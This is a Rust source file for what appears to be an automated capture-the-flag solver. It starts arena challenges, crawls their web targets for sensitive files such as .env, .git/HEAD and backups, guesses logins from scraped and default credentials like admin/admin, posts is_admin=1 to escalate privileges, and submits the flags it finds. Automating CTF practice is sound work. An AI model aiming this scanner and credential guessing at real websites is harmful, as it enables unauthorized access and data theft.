use crate::arena::{ArenaClient, ChallengeInfo, HintResponse, SubmitFlagResponse};
use crate::runtime::RuntimeStateStore;
use crate::state::sentinel_state_dir;
use anyhow::{Context, Result};
use regex::Regex;
use reqwest::{Client, Url};
use serde::Serialize;
use std::collections::{BTreeSet, VecDeque};
use std::time::Duration;

const DEFAULT_REQUEST_TIMEOUT_SECS: u64 = 10;
const DEFAULT_MAX_DISCOVERED_PATHS: usize = 96;
const DEFAULT_STARTUP_WAIT_ATTEMPTS: usize = 12;
const DEFAULT_STARTUP_WAIT_DELAY_MS: u64 = 1_000;

const COMMON_WEB_PATHS: &[&str] = &[
    "/",
    "/robots.txt",
    "/sitemap.xml",
    "/flag",
    "/flag.txt",
    "/readme.md",
    "/README.md",
    "/.env",
    "/.env.bak",
    "/.git/HEAD",
    "/.svn/entries",
    "/.DS_Store",
    "/backup.zip",
    "/backup.tar.gz",
    "/www.zip",
    "/site.zip",
    "/wwwroot.zip",
    "/admin",
    "/admin/",
    "/admin/login",
    "/login",
    "/login.php",
    "/index.php~",
    "/index.bak",
    "/config.php.bak",
    "/phpinfo.php",
    "/debug",
    "/test",
    "/swagger-ui",
    "/swagger-ui.html",
    "/swagger.json",
    "/openapi.json",
    "/api",
    "/api/docs",
];

#[derive(Debug, Serialize)]
pub struct SolveOneReport {
    pub code: String,
    pub title: String,
    pub description: String,
    pub entrypoints: Vec<String>,
    pub probed_urls: Vec<String>,
    pub discovered_flags: Vec<String>,
    pub submissions: Vec<SubmitFlagAttempt>,
    pub hint: Option<String>,
    pub stopped: bool,
    pub challenge_solved: bool,
}

#[derive(Debug, Serialize)]
pub struct SubmitFlagAttempt {
    pub flag: String,
    pub correct: bool,
    pub message: String,
    pub flag_got_count: i32,
    pub flag_count: i32,
}

#[derive(Debug, Serialize)]
pub struct SolveAllReport {
    pub selected_codes: Vec<String>,
    pub attempted: usize,
    pub solved: usize,
    pub flags_discovered: usize,
    pub results: Vec<SolveOneReport>,
}

pub struct SolveOptions {
    pub allow_hint: bool,
    pub stop_when_done: bool,
    pub max_requests_per_target: usize,
}

pub struct SolveFilters {
    pub max_level: Option<i32>,
    pub difficulties: Vec<String>,
    pub include_solved: bool,
    pub limit: Option<usize>,
}

pub async fn solve_one(
    arena: &ArenaClient,
    code: &str,
    options: SolveOptions,
) -> Result<SolveOneReport> {
    let list = arena.list_challenges().await?;
    let challenge = list
        .challenges
        .into_iter()
        .find(|item| item.code == code)
        .with_context(|| format!("challenge not found or not unlocked: {}", code))?;

    solve_visible_challenge(arena, challenge, &options).await
}

pub async fn solve_all(
    arena: &ArenaClient,
    options: SolveOptions,
    filters: SolveFilters,
) -> Result<SolveAllReport> {
    let list = arena.list_challenges().await?;
    let challenges = select_challenges(list.challenges, &filters);
    let selected_codes = challenges.iter().map(|item| item.code.clone()).collect();

    let mut results = Vec::new();
    for challenge in challenges {
        let report = solve_visible_challenge(arena, challenge, &options).await?;
        results.push(report);
    }

    let solved = results.iter().filter(|item| item.challenge_solved).count();
    let flags_discovered = results.iter().map(|item| item.discovered_flags.len()).sum();

    Ok(SolveAllReport {
        selected_codes,
        attempted: results.len(),
        solved,
        flags_discovered,
        results,
    })
}

pub(crate) async fn solve_visible_challenge(
    arena: &ArenaClient,
    challenge: ChallengeInfo,
    options: &SolveOptions,
) -> Result<SolveOneReport> {
    let store = RuntimeStateStore::new(sentinel_state_dir());
    let code = challenge.code.clone();
    let mut run_state = store.load_challenge(&code).await?;
    run_state.title = Some(challenge.title.clone());
    run_state.last_started_at = Some(chrono::Utc::now().to_rfc3339());
    run_state.last_status = Some("running".to_string());
    store.save_challenge(&run_state).await?;
    let _ = store
        .append_event(
            "challenge_started",
            &serde_json::json!({
                "code": code,
                "title": challenge.title,
                "level": challenge.level,
                "difficulty": challenge.difficulty,
            }),
        )
        .await;

    let started = arena.start_challenge(&code).await?;
    let entrypoints = started.entrypoints.clone();
    let mut flag_candidates = BTreeSet::new();
    let mut probed_urls = Vec::new();
    let mut hint_text = None;

    let http_client = build_probe_client()?;
    for entrypoint in &entrypoints {
        wait_for_entrypoint_ready(&http_client, entrypoint).await?;
        let probe_result = probe_entrypoint(
            &http_client,
            entrypoint,
            &challenge,
            options.max_requests_per_target,
        )
        .await?;
        probed_urls.extend(probe_result.probed_urls);
        flag_candidates.extend(probe_result.flags);
    }

    if flag_candidates.is_empty() && options.allow_hint {
        let hint = arena.view_hint(&code).await?;
        hint_text = hint.hint_content.clone();
        for entrypoint in &entrypoints {
            let probe_result = probe_hint_paths(
                &http_client,
                entrypoint,
                &hint,
                options.max_requests_per_target,
            )
            .await?;
            probed_urls.extend(probe_result.probed_urls);
            flag_candidates.extend(probe_result.flags);
        }
    }

    run_state
        .discovered_flags
        .extend(flag_candidates.iter().cloned());
    run_state.probed_urls.extend(probed_urls.iter().cloned());
    store.save_challenge(&run_state).await?;

    let mut submissions = Vec::new();
    for flag in &flag_candidates {
        if run_state.submitted_flags.contains(flag) {
            submissions.push(SubmitFlagAttempt {
                flag: flag.clone(),
                correct: run_state.accepted_flags.contains(flag),
                message: "skipped duplicate submission from previous run".to_string(),
                flag_count: challenge.flag_count,
                flag_got_count: challenge.flag_got_count,
            });
            continue;
        }

        let result = arena.submit_flag(&code, flag).await?;
        run_state.submitted_flags.insert(flag.clone());
        if result.correct {
            run_state.accepted_flags.insert(flag.clone());
        }
        let _ = store
            .append_event(
                "flag_submitted",
                &serde_json::json!({
                    "code": code,
                    "flag": flag,
                    "correct": result.correct,
                    "message": result.message,
                }),
            )
            .await;
        submissions.push(map_submission(flag, result));
    }

    let mut stopped = false;
    if options.stop_when_done {
        let _ = arena.stop_challenge(&code).await;
        stopped = true;
    }

    let challenge_solved = submissions.iter().any(|item| item.correct);
    run_state.last_finished_at = Some(chrono::Utc::now().to_rfc3339());
    run_state.last_status = Some(if challenge_solved {
        "solved".to_string()
    } else {
        "finished".to_string()
    });
    store.save_challenge(&run_state).await?;

    Ok(SolveOneReport {
        code: challenge.code,
        title: challenge.title,
        description: challenge.description,
        entrypoints,
        probed_urls,
        discovered_flags: flag_candidates.into_iter().collect(),
        submissions,
        hint: hint_text,
        stopped,
        challenge_solved,
    })
}

#[derive(Default)]
struct ProbeResult {
    probed_urls: Vec<String>,
    flags: BTreeSet<String>,
}

fn build_probe_client() -> Result<Client> {
    Client::builder()
        .cookie_store(true)
        .timeout(Duration::from_secs(DEFAULT_REQUEST_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .no_proxy()
        .redirect(reqwest::redirect::Policy::limited(5))
        .build()
        .context("failed to build probe HTTP client")
}

async fn probe_entrypoint(
    client: &Client,
    entrypoint: &str,
    challenge: &ChallengeInfo,
    max_requests: usize,
) -> Result<ProbeResult> {
    let mut candidates = initial_candidate_paths(challenge);
    candidates.extend(derive_hint_paths_from_text(&challenge.description));
    probe_paths(client, entrypoint, candidates, max_requests).await
}

async fn probe_hint_paths(
    client: &Client,
    entrypoint: &str,
    hint: &HintResponse,
    max_requests: usize,
) -> Result<ProbeResult> {
    let mut candidates = vec!["/".to_string()];
    if let Some(text) = hint.hint_content.as_deref() {
        candidates.extend(derive_hint_paths_from_text(text));
    }
    probe_paths(client, entrypoint, candidates, max_requests).await
}

async fn probe_paths(
    client: &Client,
    entrypoint: &str,
    initial_paths: Vec<String>,
    max_requests: usize,
) -> Result<ProbeResult> {
    let base_url = normalize_entrypoint_to_url(entrypoint)?;
    let mut queue: VecDeque<String> = initial_paths.into_iter().collect();
    let mut seen_paths = BTreeSet::new();
    let mut seen_urls = BTreeSet::new();
    let mut result = ProbeResult::default();

    while let Some(path) = queue.pop_front() {
        if result.probed_urls.len() >= max_requests
            || seen_paths.len() >= DEFAULT_MAX_DISCOVERED_PATHS
        {
            break;
        }

        let normalized_path = normalize_path(&path);
        if !seen_paths.insert(normalized_path.clone()) {
            continue;
        }

        let url_variants = build_url_variants(&base_url, &normalized_path)?;
        for url in url_variants {
            if result.probed_urls.len() >= max_requests {
                break;
            }

            let url_key = url.as_str().to_string();
            if !seen_urls.insert(url_key.clone()) {
                continue;
            }

            let response = match client.get(url.clone()).send().await {
                Ok(response) => response,
                Err(_) => continue,
            };

            let status = response.status();
            let text = match response.text().await {
                Ok(text) => text,
                Err(_) => continue,
            };

            result.probed_urls.push(format!("{} [{}]", url, status));
            result.flags.extend(extract_flags(&text));

            if status.is_success() {
                if is_html_like(&text) {
                    let remaining_budget = max_requests.saturating_sub(result.probed_urls.len());
                    if remaining_budget > 0 {
                        let form_result =
                            probe_forms_in_body(client, &url, &text, remaining_budget).await?;
                        result.probed_urls.extend(form_result.probed_urls);
                        result.flags.extend(form_result.flags);
                    }
                }
                for discovered in discover_paths_from_body(&text) {
                    if !seen_paths.contains(&discovered) {
                        queue.push_back(discovered);
                    }
                }
            }
        }
    }

    Ok(result)
}

async fn probe_paths_with_session_and_escalation(
    client: &Client,
    entrypoint: &str,
    initial_paths: Vec<String>,
    max_requests: usize,
) -> Result<ProbeResult> {
    let base_url = normalize_entrypoint_to_url(entrypoint)?;
    let mut queue: VecDeque<String> = initial_paths.into_iter().collect();
    let mut seen_paths = BTreeSet::new();
    let mut seen_urls = BTreeSet::new();
    let mut result = ProbeResult::default();

    while let Some(path) = queue.pop_front() {
        if result.probed_urls.len() >= max_requests
            || seen_paths.len() >= DEFAULT_MAX_DISCOVERED_PATHS
        {
            break;
        }

        let normalized_path = normalize_path(&path);
        if !seen_paths.insert(normalized_path.clone()) {
            continue;
        }

        let url_variants = build_url_variants(&base_url, &normalized_path)?;
        for url in url_variants {
            if result.probed_urls.len() >= max_requests {
                break;
            }

            let url_key = url.as_str().to_string();
            if !seen_urls.insert(url_key.clone()) {
                continue;
            }

            let response = match client.get(url.clone()).send().await {
                Ok(response) => response,
                Err(_) => continue,
            };

            let status = response.status();
            let text = match response.text().await {
                Ok(text) => text,
                Err(_) => continue,
            };

            result.probed_urls.push(format!("{} [{}]", url, status));
            result.flags.extend(extract_flags(&text));

            if status.is_success() {
                if is_html_like(&text) {
                    let remaining_budget = max_requests.saturating_sub(result.probed_urls.len());
                    if remaining_budget > 0 {
                        let escalation_result =
                            probe_privilege_escalation_form(client, &url, &text, remaining_budget)
                                .await?;
                        result.probed_urls.extend(escalation_result.probed_urls);
                        result.flags.extend(escalation_result.flags);
                    }
                }
                for discovered in discover_paths_from_body(&text) {
                    if !seen_paths.contains(&discovered) {
                        queue.push_back(discovered);
                    }
                }
            }
        }
    }

    Ok(result)
}

async fn probe_paths_with_session(
    client: &Client,
    entrypoint: &str,
    initial_paths: Vec<String>,
    max_requests: usize,
) -> Result<ProbeResult> {
    let base_url = normalize_entrypoint_to_url(entrypoint)?;
    let mut queue: VecDeque<String> = initial_paths.into_iter().collect();
    let mut seen_paths = BTreeSet::new();
    let mut seen_urls = BTreeSet::new();
    let mut result = ProbeResult::default();

    while let Some(path) = queue.pop_front() {
        if result.probed_urls.len() >= max_requests
            || seen_paths.len() >= DEFAULT_MAX_DISCOVERED_PATHS
        {
            break;
        }

        let normalized_path = normalize_path(&path);
        if !seen_paths.insert(normalized_path.clone()) {
            continue;
        }

        let url_variants = build_url_variants(&base_url, &normalized_path)?;
        for url in url_variants {
            if result.probed_urls.len() >= max_requests {
                break;
            }

            let url_key = url.as_str().to_string();
            if !seen_urls.insert(url_key.clone()) {
                continue;
            }

            let response = match client.get(url.clone()).send().await {
                Ok(response) => response,
                Err(_) => continue,
            };

            let status = response.status();
            let text = match response.text().await {
                Ok(text) => text,
                Err(_) => continue,
            };

            result.probed_urls.push(format!("{} [{}]", url, status));
            result.flags.extend(extract_flags(&text));

            if status.is_success() {
                for discovered in discover_paths_from_body(&text) {
                    if !seen_paths.contains(&discovered) {
                        queue.push_back(discovered);
                    }
                }
            }
        }
    }

    Ok(result)
}

fn map_submission(flag: &str, result: SubmitFlagResponse) -> SubmitFlagAttempt {
    SubmitFlagAttempt {
        flag: flag.to_string(),
        correct: result.correct,
        message: result.message,
        flag_count: result.flag_count,
        flag_got_count: result.flag_got_count,
    }
}

pub(crate) fn select_challenges(
    mut challenges: Vec<ChallengeInfo>,
    filters: &SolveFilters,
) -> Vec<ChallengeInfo> {
    let normalized_difficulties: BTreeSet<String> = filters
        .difficulties
        .iter()
        .map(|item| item.trim().to_ascii_lowercase())
        .filter(|item| !item.is_empty())
        .collect();

    challenges.retain(|challenge| {
        if !filters.include_solved && challenge.flag_got_count >= challenge.flag_count {
            return false;
        }
        if let Some(max_level) = filters.max_level {
            if challenge.level > max_level {
                return false;
            }
        }
        if !normalized_difficulties.is_empty()
            && !normalized_difficulties.contains(&challenge.difficulty.to_ascii_lowercase())
        {
            return false;
        }
        true
    });

    challenges.sort_by(|left, right| {
        left.level
            .cmp(&right.level)
            .then_with(|| {
                difficulty_rank(&left.difficulty).cmp(&difficulty_rank(&right.difficulty))
            })
            .then_with(|| right.total_score.cmp(&left.total_score))
            .then_with(|| left.title.cmp(&right.title))
    });

    if let Some(limit) = filters.limit {
        challenges.truncate(limit);
    }

    challenges
}

fn difficulty_rank(value: &str) -> i32 {
    match value.to_ascii_lowercase().as_str() {
        "easy" => 0,
        "medium" => 1,
        "hard" => 2,
        _ => 3,
    }
}

fn normalize_entrypoint_to_url(entrypoint: &str) -> Result<Url> {
    let candidate = if entrypoint.starts_with("http://") || entrypoint.starts_with("https://") {
        entrypoint.to_string()
    } else {
        format!("http://{}", entrypoint)
    };
    Url::parse(&candidate).with_context(|| format!("invalid entrypoint URL: {}", entrypoint))
}

fn build_url_variants(base_url: &Url, path: &str) -> Result<Vec<Url>> {
    let mut urls = Vec::new();

    if path == "/" {
        urls.push(base_url.clone());
        if let Ok(root_url) = base_url.join("/") {
            urls.push(root_url);
        }
    } else {
        if let Ok(relative_url) = base_url.join(path.trim_start_matches('/')) {
            urls.push(relative_url);
        }
        if let Ok(root_url) = base_url.join(path) {
            urls.push(root_url);
        }
    }

    let mut seen = BTreeSet::new();
    urls.retain(|url| seen.insert(url.as_str().to_string()));

    if urls.is_empty() {
        return Err(anyhow::anyhow!(
            "failed to build URL variants for base={} path={}",
            base_url,
            path
        ));
    }

    Ok(urls)
}

async fn probe_forms_in_body(
    client: &Client,
    page_url: &Url,
    body: &str,
    request_budget: usize,
) -> Result<ProbeResult> {
    let mut result = ProbeResult::default();
    let forms = extract_forms(body);
    if forms.is_empty() || request_budget == 0 {
        return Ok(result);
    }

    let credentials = candidate_credentials(body);
    for form in forms {
        if !form.has_password || result.probed_urls.len() >= request_budget {
            continue;
        }

        let target_url = match form.resolve_target(page_url) {
            Ok(url) => url,
            Err(_) => continue,
        };

        for (username, password) in &credentials {
            if result.probed_urls.len() >= request_budget {
                break;
            }

            let response =
                match submit_form_attempt(client, &form, &target_url, username, password).await {
                    Ok(response) => response,
                    Err(_) => continue,
                };

            let status = response.status();
            let final_url = response.url().clone();
            let text = match response.text().await {
                Ok(text) => text,
                Err(_) => continue,
            };

            result.probed_urls.push(format!(
                "{} [{}] form:{}:{}",
                target_url, status, username, password
            ));
            result.flags.extend(extract_flags(&text));

            if status.is_success() && is_html_like(&text) {
                let remaining_budget = request_budget.saturating_sub(result.probed_urls.len());
                if remaining_budget > 0 {
                    let mut follow_up_paths = discover_paths_from_body(&text);
                    follow_up_paths.push("/".to_string());
                    let follow_up = probe_paths_with_session_and_escalation(
                        client,
                        final_url.as_str(),
                        follow_up_paths,
                        remaining_budget,
                    )
                    .await?;
                    result.probed_urls.extend(follow_up.probed_urls);
                    result.flags.extend(follow_up.flags);
                }
            }
        }
    }

    Ok(result)
}

async fn wait_for_entrypoint_ready(client: &Client, entrypoint: &str) -> Result<()> {
    let url = normalize_entrypoint_to_url(entrypoint)?;
    for _ in 0..DEFAULT_STARTUP_WAIT_ATTEMPTS {
        match client.get(url.clone()).send().await {
            Ok(_) => return Ok(()),
            Err(_) => {
                tokio::time::sleep(Duration::from_millis(DEFAULT_STARTUP_WAIT_DELAY_MS)).await
            }
        }
    }
    Ok(())
}

async fn submit_form_attempt(
    client: &Client,
    form: &HtmlForm,
    target_url: &Url,
    username: &str,
    password: &str,
) -> Result<reqwest::Response> {
    let mut params: Vec<(String, String)> = Vec::new();
    let user_field = form
        .username_field
        .clone()
        .unwrap_or_else(|| "username".to_string());
    let pass_field = form
        .password_field
        .clone()
        .unwrap_or_else(|| "password".to_string());

    params.push((user_field, username.to_string()));
    params.push((pass_field, password.to_string()));
    for hidden in &form.hidden_fields {
        params.push(hidden.clone());
    }

    let method = form.method.as_deref().unwrap_or("post");
    if method.eq_ignore_ascii_case("get") {
        client
            .get(target_url.clone())
            .query(&params)
            .send()
            .await
            .context("form GET request failed")
    } else {
        client
            .post(target_url.clone())
            .form(&params)
            .send()
            .await
            .context("form POST request failed")
    }
}

fn is_html_like(body: &str) -> bool {
    let sample = body.to_ascii_lowercase();
    sample.contains("<html") || sample.contains("<body") || sample.contains("<form")
}

#[derive(Debug, Clone)]
struct HtmlForm {
    action: Option<String>,
    method: Option<String>,
    username_field: Option<String>,
    password_field: Option<String>,
    hidden_fields: Vec<(String, String)>,
    has_password: bool,
}

impl HtmlForm {
    fn resolve_target(&self, page_url: &Url) -> Result<Url> {
        if let Some(action) = self.action.as_deref() {
            if action.trim().is_empty() {
                return Ok(page_url.clone());
            }
            return page_url
                .join(action)
                .with_context(|| format!("failed to resolve form action: {}", action));
        }
        Ok(page_url.clone())
    }
}

fn extract_forms(body: &str) -> Vec<HtmlForm> {
    let form_regex = Regex::new(r#"(?is)<form([^>]*)>(.*?)</form>"#).expect("valid form regex");
    let attr_regex = Regex::new(r#"(?i)([a-zA-Z_:][a-zA-Z0-9_:\-]*)\s*=\s*["']([^"']*)["']"#)
        .expect("valid attr regex");
    let input_regex = Regex::new(r#"(?is)<input([^>]*)>"#).expect("valid input regex");
    let mut forms = Vec::new();

    for capture in form_regex.captures_iter(body) {
        let attrs = capture.get(1).map(|m| m.as_str()).unwrap_or("");
        let inner = capture.get(2).map(|m| m.as_str()).unwrap_or("");
        let form_attrs = parse_attributes(attrs, &attr_regex);
        let mut username_field = None;
        let mut password_field = None;
        let mut hidden_fields = Vec::new();
        let mut has_password = false;

        for input_capture in input_regex.captures_iter(inner) {
            let input_attrs = input_capture.get(1).map(|m| m.as_str()).unwrap_or("");
            let attrs = parse_attributes(input_attrs, &attr_regex);
            let name = match attrs.get("name") {
                Some(value) if !value.is_empty() => value.clone(),
                _ => continue,
            };
            let input_type = attrs
                .get("type")
                .map(|value| value.to_ascii_lowercase())
                .unwrap_or_else(|| "text".to_string());
            match input_type.as_str() {
                "password" => {
                    password_field = Some(name);
                    has_password = true;
                }
                "hidden" => {
                    hidden_fields.push((name, attrs.get("value").cloned().unwrap_or_default()));
                }
                "text" | "email" | "username" => {
                    if username_field.is_none() {
                        username_field = Some(name);
                    }
                }
                _ => {}
            }
        }

        forms.push(HtmlForm {
            action: form_attrs.get("action").cloned(),
            method: form_attrs.get("method").cloned(),
            username_field,
            password_field,
            hidden_fields,
            has_password,
        });
    }

    forms
}

fn parse_attributes(
    source: &str,
    attr_regex: &Regex,
) -> std::collections::BTreeMap<String, String> {
    let mut attrs = std::collections::BTreeMap::new();
    for capture in attr_regex.captures_iter(source) {
        let key = capture
            .get(1)
            .map(|m| m.as_str().to_ascii_lowercase())
            .unwrap_or_default();
        let value = capture
            .get(2)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        attrs.insert(key, value);
    }
    attrs
}

fn candidate_credentials(body: &str) -> Vec<(String, String)> {
    let mut credentials = Vec::new();
    let mut seen = BTreeSet::new();

    for credential in extract_credentials_from_body(body) {
        if seen.insert(credential.clone()) {
            credentials.push(credential);
        }
    }

    for credential in common_credentials() {
        if seen.insert(credential.clone()) {
            credentials.push(credential);
        }
    }

    credentials
}

fn extract_credentials_from_body(body: &str) -> Vec<(String, String)> {
    let mut credentials = Vec::new();
    let mut seen = BTreeSet::new();
    let inline_regex =
        Regex::new(r#"(?is)username:\s*</strong>\s*([^\s<]+).*?password:\s*</strong>\s*([^\s<]+)"#)
            .expect("valid inline credential regex");
    let label_regex = Regex::new(
        r#"(?im)(?:username|user|account|company\s+name)\s*[:=]\s*([A-Za-z0-9_.@-]+).*(?:password|pass)\s*[:=]\s*([A-Za-z0-9_.!@#\$%\^&\*\-]+)"#,
    )
    .expect("valid label credential regex");

    for captures in inline_regex.captures_iter(body) {
        if let (Some(username), Some(password)) = (captures.get(1), captures.get(2)) {
            let credential = (username.as_str().to_string(), password.as_str().to_string());
            if seen.insert(credential.clone()) {
                credentials.push(credential);
            }
        }
    }

    for captures in label_regex.captures_iter(body) {
        if let (Some(username), Some(password)) = (captures.get(1), captures.get(2)) {
            let credential = (username.as_str().to_string(), password.as_str().to_string());
            if seen.insert(credential.clone()) {
                credentials.push(credential);
            }
        }
    }

    credentials
}

fn common_credentials() -> Vec<(String, String)> {
    vec![
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("administrator", "administrator"),
        ("demo", "demo"),
        ("test", "test"),
        ("guest", "guest"),
        ("root", "root"),
    ]
    .into_iter()
    .map(|(username, password)| (username.to_string(), password.to_string()))
    .collect()
}

async fn probe_privilege_escalation_form(
    client: &Client,
    page_url: &Url,
    body: &str,
    request_budget: usize,
) -> Result<ProbeResult> {
    let mut result = ProbeResult::default();
    if request_budget == 0
        || !body.contains("name=\"is_admin\"")
        || !body.to_ascii_lowercase().contains("disabled")
    {
        return Ok(result);
    }

    let action_regex =
        Regex::new(r#"(?is)<form[^>]*action=["']([^"']+)["'][^>]*>.*?name=["']is_admin["']"#)
            .expect("valid admin action regex");
    let name_regex = Regex::new(r#"(?is)<input[^>]*name=["']name["'][^>]*value=["']([^"']*)["']"#)
        .expect("valid name value regex");

    let action = action_regex
        .captures(body)
        .and_then(|captures| captures.get(1).map(|item| item.as_str().to_string()));
    let target_url = if let Some(action) = action {
        page_url
            .join(&action)
            .with_context(|| format!("failed to resolve admin form action: {}", action))?
    } else {
        page_url.clone()
    };
    let company_name = name_regex
        .captures(body)
        .and_then(|captures| captures.get(1).map(|item| item.as_str().to_string()))
        .unwrap_or_else(|| "demo".to_string());

    let response = client
        .post(target_url.clone())
        .form(&[("name", company_name.as_str()), ("is_admin", "1")])
        .send()
        .await
        .context("admin escalation form request failed")?;
    let status = response.status();
    let final_url = response.url().clone();
    let text = response
        .text()
        .await
        .context("failed to read admin escalation response body")?;

    result
        .probed_urls
        .push(format!("{} [{}] form:is_admin=1", target_url, status));
    result.flags.extend(extract_flags(&text));

    if status.is_success() && is_html_like(&text) {
        let remaining_budget = request_budget.saturating_sub(result.probed_urls.len());
        if remaining_budget > 0 {
            let mut follow_up_paths = discover_paths_from_body(&text);
            follow_up_paths.push("/".to_string());
            let follow_up = probe_paths_with_session(
                client,
                final_url.as_str(),
                follow_up_paths,
                remaining_budget,
            )
            .await?;
            result.probed_urls.extend(follow_up.probed_urls);
            result.flags.extend(follow_up.flags);
        }
    }

    Ok(result)
}

fn normalize_path(path: &str) -> String {
    let trimmed = path.trim();
    if trimmed.is_empty() {
        "/".to_string()
    } else if trimmed.starts_with('/') {
        trimmed.to_string()
    } else {
        format!("/{}", trimmed)
    }
}

fn initial_candidate_paths(challenge: &ChallengeInfo) -> Vec<String> {
    let mut paths: BTreeSet<String> = COMMON_WEB_PATHS
        .iter()
        .map(|item| (*item).to_string())
        .collect();

    let text = format!("{} {}", challenge.title, challenge.description).to_lowercase();
    if text.contains("portal") {
        paths.insert("/portal".to_string());
    }
    if text.contains("admin") {
        paths.insert("/admin/login".to_string());
        paths.insert("/admin.php".to_string());
    }
    if text.contains("api") {
        paths.insert("/api/v1".to_string());
        paths.insert("/api/swagger".to_string());
    }
    if text.contains("upload") {
        paths.insert("/upload".to_string());
        paths.insert("/uploads".to_string());
    }
    if text.contains("employee") {
        paths.insert("/employee".to_string());
        paths.insert("/employees".to_string());
    }
    if text.contains("company") {
        paths.insert("/company".to_string());
        paths.insert("/portal".to_string());
    }

    paths.into_iter().collect()
}

fn derive_hint_paths_from_text(text: &str) -> Vec<String> {
    let path_regex =
        Regex::new(r#"(?i)(/[\w\-.~/?=&]+|[\w\-.]+\.(txt|zip|bak|old|php|env|log|json))"#)
            .expect("valid path regex");
    let mut paths = BTreeSet::new();

    for capture in path_regex.captures_iter(text) {
        if let Some(value) = capture.get(1) {
            paths.insert(normalize_path(value.as_str()));
        }
    }

    let lower = text.to_lowercase();
    if lower.contains("robots") {
        paths.insert("/robots.txt".to_string());
    }
    if lower.contains("backup") {
        paths.insert("/backup.zip".to_string());
        paths.insert("/backup.tar.gz".to_string());
        paths.insert("/www.zip".to_string());
    }
    if lower.contains("env") {
        paths.insert("/.env".to_string());
        paths.insert("/.env.bak".to_string());
    }
    if lower.contains("git") {
        paths.insert("/.git/HEAD".to_string());
    }
    if lower.contains("swagger") {
        paths.insert("/swagger-ui".to_string());
        paths.insert("/swagger.json".to_string());
        paths.insert("/openapi.json".to_string());
    }

    paths.into_iter().collect()
}

fn discover_paths_from_body(body: &str) -> Vec<String> {
    let attr_regex =
        Regex::new(r#"(?i)(?:href|src|action)=["']([^"'#]+)["']"#).expect("valid link regex");
    let route_regex = Regex::new(r#"(?i)(/[\w\-.]+(?:/[\w\-.]+){0,4}(?:\?[\w\-=&.%]+)?)"#)
        .expect("valid route regex");
    let mut paths = BTreeSet::new();

    for capture in attr_regex.captures_iter(body) {
        if let Some(value) = capture.get(1) {
            let candidate = value.as_str();
            if should_skip_path_candidate(candidate) {
                continue;
            }
            paths.insert(normalize_path(candidate));
        }
    }

    for capture in route_regex.captures_iter(body) {
        if let Some(value) = capture.get(1) {
            let candidate = value.as_str();
            if should_skip_path_candidate(candidate) {
                continue;
            }
            if looks_like_interesting_path(candidate) {
                paths.insert(normalize_path(candidate));
            }
        }
    }

    paths.into_iter().collect()
}

fn should_skip_path_candidate(candidate: &str) -> bool {
    candidate.starts_with("http://")
        || candidate.starts_with("https://")
        || candidate.starts_with("javascript:")
        || candidate.starts_with("mailto:")
        || candidate.starts_with("data:")
        || candidate.starts_with('#')
}

fn looks_like_interesting_path(candidate: &str) -> bool {
    let lower = candidate.to_ascii_lowercase();
    lower.contains("admin")
        || lower.contains("login")
        || lower.contains("flag")
        || lower.contains("debug")
        || lower.contains("test")
        || lower.contains("backup")
        || lower.contains("swagger")
        || lower.contains("api")
        || lower.ends_with(".txt")
        || lower.ends_with(".zip")
        || lower.ends_with(".bak")
        || lower.ends_with(".env")
        || lower.ends_with(".json")
}

fn extract_flags(body: &str) -> BTreeSet<String> {
    let regex = Regex::new(r#"flag\{[^}\r\n]{1,256}\}"#).expect("valid flag regex");
    regex
        .find_iter(body)
        .map(|match_| match_.as_str().to_string())
        .collect()
}
